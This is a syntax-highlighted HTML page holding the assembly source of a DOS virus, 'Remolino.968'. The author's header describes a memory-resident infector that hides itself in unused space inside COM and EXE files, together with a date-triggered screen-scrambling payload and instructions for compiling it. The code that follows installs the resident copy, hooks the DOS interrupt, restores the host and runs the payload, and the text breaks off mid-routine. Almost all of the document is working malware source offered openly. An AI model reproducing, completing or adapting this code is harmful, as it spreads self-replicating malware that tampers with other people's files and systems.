<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Virus.DOS.Critico.969 - remolino.asm.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; Remolino.968</span><span class="sc0">
</span><span class="sc1">; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ&gt;</span><span class="sc0">
</span><span class="sc1">;                                                          Trumpet WinCock</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; ş Infects COM and EXE files without increasing their size</span><span class="sc0">
</span><span class="sc1">; ş Memory resident</span><span class="sc0">
</span><span class="sc1">; ş Infection on execution (4b00h)</span><span class="sc0">
</span><span class="sc1">; ş 968 bytes long</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; This is the first  sample of a new kind of infectors; neither appending,</span><span class="sc0">
</span><span class="sc1">; nor prepending, nor ap-pre-pending, nor even overwriting... it's a guest</span><span class="sc0">
</span><span class="sc1">; infector. It goes memory resident and, when files are executed, it looks</span><span class="sc0">
</span><span class="sc1">; for enough room in their code to place a copy of itself, so the infected</span><span class="sc0">
</span><span class="sc1">; file length  doesn't grow, the host  will work, and we won't have to use</span><span class="sc0">
</span><span class="sc1">; any kind of stealth technique.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Of course, these bytes i  mean are empty or unused bytes; anyway, have a</span><span class="sc0">
</span><span class="sc1">; look further at the code and see how  does my  virus look for free space</span><span class="sc0">
</span><span class="sc1">; in their victims.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Besides this, the virus took its name from its  payload (remolino is the</span><span class="sc0">
</span><span class="sc1">; spanish word for whirlwind, or in this case, 'whirlscreen'), which beca-</span><span class="sc0">
</span><span class="sc1">; me rather famous, being  even used -an adaption- by NuKE in their zines.</span><span class="sc0">
</span><span class="sc1">; It activates  when the virus is  executed in march and the seconds field</span><span class="sc0">
</span><span class="sc1">; in the system time is equal to eight.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Compiling instructions:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; tasm /m remolino.asm</span><span class="sc0">
</span><span class="sc1">; tlink remolino.obj</span><span class="sc0">
</span><span class="sc1">; exe2bin remolino.exe remolino.com</span><span class="sc0">


</span><span class="sc5">codigo</span><span class="sc0">      </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">public</span><span class="sc0"> </span><span class="sc12">'code'</span><span class="sc0">
            </span><span class="sc9">assume</span><span class="sc0">  </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">codigo</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">codigo</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">codigo</span><span class="sc4">,</span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc5">codigo</span><span class="sc0">
            </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc2">0h</span><span class="sc0">

</span><span class="sc5">octetos</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">des21</span><span class="sc4">)-</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">criatura</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">palabras</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc5">octetos</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">)/</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">parrafos</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">ultimo</span><span class="sc4">)-</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">criatura</span><span class="sc4">)+</span><span class="sc2">15</span><span class="sc4">)/</span><span class="sc2">16</span><span class="sc0">

</span><span class="sc5">criatura</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">                        </span><span class="sc1">; Virus start</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                          </span><span class="sc1">; Push registers</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">proxima01</span><span class="sc0">

</span><span class="sc5">proxima01</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">
            </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">proxima01</span><span class="sc4">)</span><span class="sc0">        </span><span class="sc1">; Get delta offset</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">8888h</span><span class="sc0">                    </span><span class="sc1">; Install check</span><span class="sc0">
            </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

            </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0ca05h</span><span class="sc0">
            </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">reside02</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">14</span><span class="sc0">                       </span><span class="sc1">; Move the data to the</span><span class="sc0">
            </span><span class="sc6">cld</span><span class="sc0">                                 </span><span class="sc1">; resident copy</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">salto</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
            </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">                          </span><span class="sc1">; Jump to the copy</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">restaura05</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
            </span><span class="sc6">retf</span><span class="sc0">

</span><span class="sc5">reside02</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">                 </span><span class="sc1">; Get last fit strategy</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5801h</span><span class="sc0">
            </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc5">parrafos</span><span class="sc0">            </span><span class="sc1">; Ask for a memory block</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">48h</span><span class="sc0">
            </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
            </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">marca03</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">                  </span><span class="sc1">; Point to the MCB header</span><span class="sc0">
            </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0003h</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; Restore the original file</span><span class="sc0">
            </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc5">parrafos</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">          </span><span class="sc1">; size to the program</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4ah</span><span class="sc0">
            </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc5">parrafos</span><span class="sc0">            </span><span class="sc1">; Ask for a block with the</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">48h</span><span class="sc0">                 </span><span class="sc1">; original size</span><span class="sc0">
            </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
            </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">0002h</span><span class="sc4">],</span><span class="sc5">parrafos</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">

</span><span class="sc5">marca03</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                  </span><span class="sc1">; Mark the block as used</span><span class="sc0">
            </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                     </span><span class="sc1">; by DOS</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0001h</span><span class="sc4">],</span><span class="sc2">0008h</span><span class="sc0">

            </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">                  </span><span class="sc1">; Restore the last fit strategy</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5801h</span><span class="sc0">
            </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">palabras</span><span class="sc0">            </span><span class="sc1">; Copy the viral code into</span><span class="sc0">
            </span><span class="sc6">cld</span><span class="sc0">                            </span><span class="sc1">; the new block</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
            </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsw</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">                     </span><span class="sc1">; Jump to the new copy</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">cambia04</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
            </span><span class="sc6">retf</span><span class="sc0">

</span><span class="sc5">cambia04</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3521h</span><span class="sc0">               </span><span class="sc1">; Read and write the original</span><span class="sc0">
            </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                    </span><span class="sc1">; int 21h vector</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">des21</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">seg21</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">

            </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">rutina21</span><span class="sc0">            </span><span class="sc1">; Make it point to ours</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2521h</span><span class="sc0">
            </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc5">restaura05</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">                     </span><span class="sc1">; Empty the stack</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">                     </span><span class="sc1">; Restore the block owned</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">                     </span><span class="sc1">; by the previous code</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">palabras</span><span class="sc0">
            </span><span class="sc6">cld</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">dato</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
            </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">stosw</span><span class="sc0">

            </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">salto</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                </span><span class="sc1">; Jump if it's an EXE</span><span class="sc0">
            </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">apila06</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">principio</span><span class="sc4">[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; Restore the first three</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">0100h</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">          </span><span class="sc1">; bytes of the host file</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">principio</span><span class="sc4">[</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">0102h</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">

</span><span class="sc5">apila06</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">                  </span><span class="sc1">; Save the original entry</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">retorno</span><span class="sc4">[</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; point address</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">retorno</span><span class="sc4">[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                  </span><span class="sc1">; Restore registers</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">

            </span><span class="sc6">retf</span><span class="sc0">                           </span><span class="sc1">; Jump to the restored host</span><span class="sc0">
</span><span class="sc5">criatura</span><span class="sc0">    </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">desplazador</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
</span><span class="sc5">caracter07</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">                  </span><span class="sc1">; Move a character one</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                  </span><span class="sc1">; position each time this</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">; routine is called</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">bp</span><span class="sc0">
            </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">caracter07</span><span class="sc0">
            </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">desplazador</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">remolino</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">                   </span><span class="sc1">; Whirlscreen payload</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2ah</span><span class="sc0">                 </span><span class="sc1">; Get the system date</span><span class="sc0">
            </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                   </span><span class="sc1">; March?</span><span class="sc0">
            </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">fin08</span><span class="sc0">
                                           </span><span class="sc1">; Get the system time</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2ch</span><span class="sc0">
            </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">                   </span><span class="sc1">; Seconds=8?</span><span class="sc0">
            </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">fin08</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0fh</span><span class="sc0">                 </span><span class="sc1">; Get video mode</span><span class="sc0">
            </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">10h</span><span class="sc0">

            </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">                 </span><span class="sc1">; Jump if it's 80x25 text</span><span class="sc0">
            </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">color09</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
            </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">color09</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc0">
            </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">mono10</span><span class="sc0">
</span><span class="sc5">fin08</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">color09</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0b800h</span><span class="sc0">              </span><span class="sc1">; Calculate the start of the</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">pagina11</span><span class="sc0">               </span><span class="sc1">; video memory</span><span class="sc0">
</span><span class="sc5">mono10</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0b000h</span><span class="sc0">

</span><span class="sc5">pagina11</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">bh</span><span class="sc0">                  </span><span class="sc1">; Add the page number</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">56</span><span class="sc0">                  </span><span class="sc1">; Display the message in the</span><span class="sc0">
            </span><span class="sc6">cld</span><span class="sc0">                            </span><span class="sc1">; middle of the screen</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">mensaje</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0cfh</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">1944</span><span class="sc0">

</span><span class="sc5">mueve12</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">lodsb</span><span class="sc0">
            </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">
            </span><span class="sc6">stosw</span><span class="sc0">
            </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">mueve12</span><span class="sc0">

            </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">61h</span><span class="sc0">                 </span><span class="sc1">; Internal speaker on</span><span class="sc0">
            </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
            </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">61h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">                     </span><span class="sc1">; Makes every character rotate</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">                     </span><span class="sc1">; and disappear</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">1944</span><span class="sc0">

</span><span class="sc5">caracter13</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0b6h</span><span class="sc0">                </span><span class="sc1">; Get the timer ready</span><span class="sc0">
            </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">43h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">

            </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">                 </span><span class="sc1">; Low frecuency for even</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">impar14</span><span class="sc0">                </span><span class="sc1">; characters and high for the</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2e9ch</span><span class="sc0">               </span><span class="sc1">; odd ones</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">envia15</span><span class="sc0">

</span><span class="sc5">impar14</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">04a9h</span><span class="sc0">

</span><span class="sc5">envia15</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">42h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
            </span><span class="sc6">out</span><span class="sc0">     </span><span class="sc2">42h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">1942</span><span class="sc0">                </span><span class="sc1">; Rotate every square in</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                   </span><span class="sc1">; a whirl-alike way</span><span class="sc0">

</span><span class="sc5">vuelta16</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">                  </span><span class="sc1">; Move down the left side</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,-</span><span class="sc2">160</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">desplazador</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">                  </span><span class="sc1">; Move to the left the upper</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">56</span><span class="sc0">                  </span><span class="sc1">; side</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">desplazador</span><span class="sc0">

            </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc0">                     </span><span class="sc1">; Move up the right side</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">160</span><span class="sc0">
